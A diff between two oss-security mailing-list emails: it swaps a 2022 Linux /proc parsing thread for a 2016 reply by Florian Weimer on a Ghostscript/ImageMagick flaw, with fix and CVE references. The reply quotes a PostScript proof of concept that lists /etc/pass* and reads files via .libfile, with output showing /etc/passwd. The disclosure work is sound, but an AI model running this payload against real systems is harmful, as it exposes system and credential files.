@@ -1,4 +1,9 @@
-Received: (qmail 5668 invoked by uid 550); 29 Dec 2022 12:38:02 -0000
+X-VM-v5-Data: ([nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
+	["1622" "Thursday" "29" "September" "2016" "08:25:54" "+0200" "Florian Weimer" "fw@deneb.enyo.de" "<877f9vcjd9.fsf@mid.deneb.enyo.de>" "60" "Re: [oss-security] ImageMagick identify \"d:\" hangs" "^Date:" nil nil "9" "2016092906:25:54" "[oss-security] ImageMagick identify \"d:\" hangs" (number mark "        fw@deneb.eny Sep 29   60/1622  " thread-indent "\"Re: [oss-security] ImageMagick identify \"d:\" hangs\"\n") "<CAJ_zFkKLKL_oZh=piots50kK=OqYvBBd3DQeehNNCzqAU4RV-Q@mail.gmail.com>" ("<alpine.GSO.2.20.1609270837170.5577@freddy.simplesystems.org>" "<20160927142500.3x26pcrhw5x4nt6s@jwilk.net>" "<alpine.GSO.2.20.1609270954220.18003@freddy.simplesystems.org>" "<CAJ_zFkLCxTbJsZM7H53Kpd_OtBCPaiFowvoHJ0K-h6=e7u_Xog@mail.gmail.com>" "<CAJ_zFkKLKL_oZh=piots50kK=OqYvBBd3DQeehNNCzqAU4RV-Q@mail.gmail.com>") nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
+	nil)
+X-Mozilla-Status: 0001
+X-Mozilla-Status2: 00000000
+Received: (qmail 30048 invoked by uid 550); 29 Sep 2016 06:26:07 -0000
 Mailing-List: contact oss-security-help@lists.openwall.com; run by ezmlm
 Precedence: bulk
 List-Post: <mailto:oss-security@lists.openwall.com>
@@ -6,50 +11,80 @@ List-Help: <mailto:oss-security-help@lists.openwall.com>
 List-Unsubscribe: <mailto:oss-security-unsubscribe@lists.openwall.com>
 List-Subscribe: <mailto:oss-security-subscribe@lists.openwall.com>
 List-ID: <oss-security.lists.openwall.com>
-Reply-To: oss-security@lists.openwall.com
-Received: (qmail 26249 invoked from network); 28 Dec 2022 22:13:34 -0000
-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed; d=mit.edu; s=outgoing;
-	t=1672265599; bh=ul/NZsCm1LN681rwuJVRjc6Rre5uxmh36nv6gaDD6Zk=;
-	h=Date:From:To:Cc:Subject:References:In-Reply-To;
-	b=bQ0sELAf0MkyDpX2YfhSPyZu7PNw0tyhKvYxrPslvfzsXpjtfbX+toZKJBF/k7E/Q
-	 0q+oMGtUtbvHyugU9FhY7p7SRFCf3Vy6HAn9MnSQFM/SHnMCIcTmm4h331Hb4ge+kq
-	 bT2B3J6rSoAt0+kyeXca4w/NmbDn3PkgsvtYApIJ0lFlw3seQNcY9Ho12tTRQS+pIt
-	 UaW9ITffzg3CAtRn1OKZhdWYtMB6+siNCskG9+wAiSTpUlW8yTumfYzNwxVs+BVqyG
-	 2KFH2FQ4XaDPM86p6mWMAR5qAFxiPUaBP6Im0tj+4hw8zB7v8Ki9kaI3j84eHTfiwp
-	 AWYK/fgfJL1Vg==
-Date: Wed, 28 Dec 2022 17:14:42 -0500
-From: "Theodore Ts'o" <tytso@mit.edu>
-To: Demi Marie Obenour <demi@invisiblethingslab.com>
-Cc: oss-security@lists.openwall.com,
-        Alejandro Colomar <alx.manpages@gmail.com>,
-        Michael Kerrisk <mtk.manpages@gmail.com>, linux-kernel@vger.kernel.org,
-        linux-man@vger.kernel.org
-Message-ID: <Y6y/0uzFlTpkw/VT@mit.edu>
-References: <Y6SJDbKBk471KE4k@p183>
- <Y6TUJcr/IHrsTE0W@codewreck.org>
- <1a1963aa1036ba07@orthanc.ca>
- <20221228152458.6xyksrxunukjrtzx@mutt-hbsd>
- <Y6xzIR9P+a6uaaEx@itl-email>
- <20221228172517.l7h3m7wjfpxr3dzw@mutt-hbsd>
- <Y6yEv+6iYQQNaqi9@itl-email>
+Received: (qmail 30025 invoked from network); 29 Sep 2016 06:26:06 -0000
+References: <alpine.GSO.2.20.1609270837170.5577@freddy.simplesystems.org>
+	<20160927142500.3x26pcrhw5x4nt6s@jwilk.net>
+	<alpine.GSO.2.20.1609270954220.18003@freddy.simplesystems.org>
+	<CAJ_zFkLCxTbJsZM7H53Kpd_OtBCPaiFowvoHJ0K-h6=e7u_Xog@mail.gmail.com>
+	<CAJ_zFkKLKL_oZh=piots50kK=OqYvBBd3DQeehNNCzqAU4RV-Q@mail.gmail.com>
+In-Reply-To: <CAJ_zFkKLKL_oZh=piots50kK=OqYvBBd3DQeehNNCzqAU4RV-Q@mail.gmail.com>
+	(Tavis Ormandy's message of "Wed, 28 Sep 2016 13:52:36 -0700")
+Message-ID: <877f9vcjd9.fsf@mid.deneb.enyo.de>
 MIME-Version: 1.0
-Content-Type: text/plain; charset=utf-8
-Content-Disposition: inline
-Content-Transfer-Encoding: 8bit
-In-Reply-To: <Y6yEv+6iYQQNaqi9@itl-email>
-Subject: Re: [oss-security] [patch] proc.5: tell how to parse /proc/*/stat
- correctly
+Content-Type: text/plain
+Date: Thu, 29 Sep 2016 08:25:54 +0200
+From: Florian Weimer <fw@deneb.enyo.de>
+Reply-To: oss-security@lists.openwall.com
+Subject: Re: [oss-security] ImageMagick identify "d:" hangs
+To: oss-security@lists.openwall.com
 
-On Wed, Dec 28, 2022 at 01:02:35PM -0500, Demi Marie Obenour wrote:
-> > I think the argument I'm trying to make is to be flexible in
-> > implementation, allowing for future needs and wants--that is "future
-> > proofing".
-> 
-> Linux should not have an XML, JSON, or YAML serializer.  Linux already
-> does way too much; let’s not add one more thing to the list.
+* Tavis Ormandy:
 
-There's always Protobufs[1]!  :-)  And all of these are better than
-ASN.1, for which Google already has a limited parser (for x.509
-certificates).   :-)   :-)   :-)
+> Here is the code I'm testing with (Note: I really don't know much
+> postscript - and I hate it).
+>
+> $ cat test.ps
+> /dumpname {
+>     dup             % copy filename
+>     dup             % copy filename
+>     print           % print filename
+>     (\n) print      % print newline
+>     status          % stat filename
+>     {
+>         (stat succeeded\n) print
+>         ( ctime:) print
+>         64 string cvs print
+>         ( atime:) print
+>         64 string cvs print
+>         ( size:) print
+>         64 string cvs print
+>         ( blocks:) print
+>         64 string cvs print
+>         (\n) print
+>         (\n) print
+>     }{
+>         (unable to stat\n\n) print
+>     } ifelse
+>     .libfile        % open as library
+>     {
+>         (.libfile returned file\n\n) print
+>         64 string readstring
+>         pop         % discard result (should proably test)
+>         print
+>         (\n) print
+>     }{
+>         (.libfile returned string\n) print
+>         print
+>         (\n) print
+>     } ifelse
+> } def
+>
+> (/etc/pass*) /dumpname load 256 string filenameforall
 
-						- Ted
+filenameforall was fixed as part of this:
+
+  http://git.ghostscript.com/?p=ghostpdl.git;a=commit;h=ab109aaeb3ddba59518b036fb288402a65cf7ce8
+  http://bugs.ghostscript.com/show_bug.cgi?id=694724
+
+This also covers getenv and has already been assigned CVE-2013-5653.
+
+> $ identify test.ps
+> /etc/passwd
+> stat succeeded
+>  ctime:1474998792 atime:1474998792 size:2662 blocks:8
+>
+> .libfile returned file
+
+.libfile is not yet fixed upstream.  I reported this upstream:
+
+  http://bugs.ghostscript.com/show_bug.cgi?id=697169
